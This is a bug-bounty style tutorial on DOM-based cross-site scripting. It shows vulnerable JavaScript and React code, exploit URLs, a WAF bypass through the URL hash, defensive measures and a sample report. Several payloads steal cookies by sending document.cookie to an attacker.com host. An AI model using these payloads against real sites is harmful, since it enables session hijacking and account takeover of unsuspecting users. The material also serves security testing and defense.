# DOM-Based Cross-Site Scripting (XSS)

## When to Use
- When auditing modern Single Page Applications (SPAs) built with React, Angular, or Vue that on client-side routing and rendering.
- When standard Reflected or Stored XSS payloads are caught by the server's Web Application Firewall (WAF), but the payload is processed in the URL fragment (`#`).
- To steal user session cookies, execute Cross-Site Request Forgery (CSRF) via XSS, or log keystrokes from a targeted user.


## Prerequisites
- Authorized scope and target URLs from bug bounty program
- Burp Suite Professional (or Community) configured with browser proxy
- Familiarity with OWASP Top 10 and common web vulnerability classes
- SecLists wordlists for fuzzing and enumeration

## Workflow

### Phase 1: Understanding Source and Sink

```javascript
// Concept: DOM XSS occurs when an application contains client-side JavaScript that 
// processes data from an untrusted "Source" in an unsafe way, usually by writing that 
// data to a dangerous "Sink".

// Sources (Where attacker controls input):
// location.search, location.hash, document.referrer, window.name

// Sinks (Where code executes):
// eval(), setTimeout(), document.write(), element.innerHTML, location.href
```

### Phase 2: Exploiting `location.search` to `innerHTML`

```html
<!-- Vulnerable application code: -->
<script>
    // Reads from the URL Search parameter (?query=...)
    let params = new URLSearchParams(window.location.search);
    let userQuery = params.get("query");
    
    // Writes directly to the DOM without escaping
    document.getElementById("search-results").innerHTML = "Results for: " + userQuery;
</script>

<!-- The Exploit: -->
<!-- Navigate to: https://target.com/search?query=<img src=x onerror=alert(document.domain)> -->
<!-- The browser parses the `<img>` tag inserted via innerHTML. The image fails to load, triggering the malicious onerror JavaScript. -->
```

### Phase 3: Exploiting `location.hash` (WAF Bypass)

```javascript
// Concept: Browsers DO NOT send the URL fragment (anything after the `#`) to the server.
// Therefore, server-side WAFs cannot detect payloads injected into the hash.

// Vulnerable application code:
window.onload = function() {
    // Reads directly from the fragment (e.g., #greetingMessage)
    var hash = window.location.hash.substring(1); 
    if(hash) {
        // DANGEROUS SINK: Evaluating a string as JavaScript code
        eval("console.log('" + hash + "');"); 
    }
}

// The Exploit:
// Navigate to: https://target.com/profile#');alert(document.cookie);//
//
// The eval function receives: eval("console.log('');alert(document.cookie);//');");
// The WAF never sees the `alert(document.cookie)` because it was in the `#`.
```

### Phase 4: Bypassing React / Modern Frameworks

```javascript
// Concept: React generally protects against XSS by encoding variables {likeThis}. 
// However, developers use `dangerouslySetInnerHTML` or process `javascript:` URIs incorrectly.

// Vulnerable React Component:
function UserProfile({ websiteUrl }) {
    // The attacker controls `websiteUrl`. React blocks <script> tags, but NOT malicious URLs.
    return (
        <a href={websiteUrl}>Click to visit my website</a>
    );
}

// The Exploit:
// The attacker sets their profile website URL in the database to:
// `javascript:fetch('https://attacker.com/?cookie='+document.cookie)`
// 
// When the victim clicks the link, the JavaScript executes within the context of the SPA.
```

## 🔵 Blue Team Detection & Defense
- **Context-Aware Escaping**: Never insert untrusted data directly into high-risk Sinks like `innerHTML`. Use `textContent` or `innerText` instead, which treat the input strictly as text, rendering HTML tags harmlessly as strings.
- **Trusted Types API**: Enforce the Trusted Types Content Security Policy (CSP) header. This forces all JavaScript writing to DANGEROUS DOM sinks to pass the data through a defined sanitization function first, virtually eliminating DOM XSS by design.
- **Strict CSP**: Implement a strict Content Security Policy (`script-src 'self'`). Prevent the execution of inline scripts (`<script>...</script>`) and strictly prohibit `eval()` and `unsafe-inline`.

## Key Concepts
| Concept | Description |
|---------|-------------|
| DOM (Document Object Model) | The structural representation of the HTML page within the browser. JavaScript interacts with and modifies the DOM dynamically |
| Source | A JavaScript property that the attacker can control (e.g., `location.hash`, `document.referrer`) |
| Sink | A JavaScript function or DOM object that executes code or renders HTML when provided with data (e.g., `eval()`, `document.write()`) |
| DOM Clobbering | An advanced XSS technique where HTML elements with specific `id` or `name` attributes are injected to overwrite global JavaScript variables used by the application |

## Output Format
```
Bug Bounty Report: DOM XSS via `location.hash` to `eval()`
==========================================================
Vulnerability: DOM-Based Cross-Site Scripting (OWASP A03:2021)
Severity: High (CVSS 8.2)
Target: `https://app.company.com/dashboard`

Description:
A DOM-Based XSS vulnerability exists on the primary dashboard page concerning the client-side processing of the URL hash fragment. The application utilizes a legacy customization script that reads `window.location.hash` to determine a custom greeting theme.

The script passes this variable directly into an `eval()` statement on line 412 of `app-bundle.js` without any sanitization or type-checking. Because the payload exists entirely within the URL fragment (`#`), it is never transmitted to the backend server, entirely bypassing the Akamai WAF.

Reproduction Steps:
1. Ensure you have an active victim session on the target application.
2. Navigate to the following crafted URL containing the payload:
   `https://app.company.com/dashboard#");fetch('https://attacker.com/log?cookie='+btoa(document.cookie));//`
3. The JavaScript executes within the victim's browser context.
4. The victim's active session cookie is encoded and transmitted to the external attacker-controlled domain.

Impact:
Full account takeover for any user who clicks the malicious link. Due to WAF evasion, this link can be distributed widely via phishing campaigns without perimeter detection.
